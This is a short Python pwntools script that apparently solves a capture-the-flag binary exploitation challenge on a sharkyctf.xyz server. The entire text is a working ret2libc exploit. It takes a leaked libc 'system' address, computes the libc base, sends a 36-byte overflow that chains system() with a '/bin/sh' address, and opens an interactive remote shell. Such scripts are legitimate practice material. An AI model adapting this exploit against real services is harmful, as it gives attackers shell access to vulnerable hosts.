from pwn import *

offset = 36

r = remote('sharkyctf.xyz', 20334)
libc = ELF('./libc-2.27.so')

leak = int(r.recvline().strip().split(' ')[-1],16)
log.info('Leaked address: {}'.format(hex(leak)))

base_addr = leak - libc.symbols['system']
log.info('Base address: {}'.format(hex(base_addr)))

system_addr = base_addr + libc.symbols['system']
shell_addr = base_addr + 0x17e0cf #next(libc.search("/bin/sh"))

payload = ""
payload += "A"*offset
payload += p64(system_addr)
payload += p64(0xdeadbeef)
payload += p64(shell_addr)

r.sendline(payload)
r.interactive()
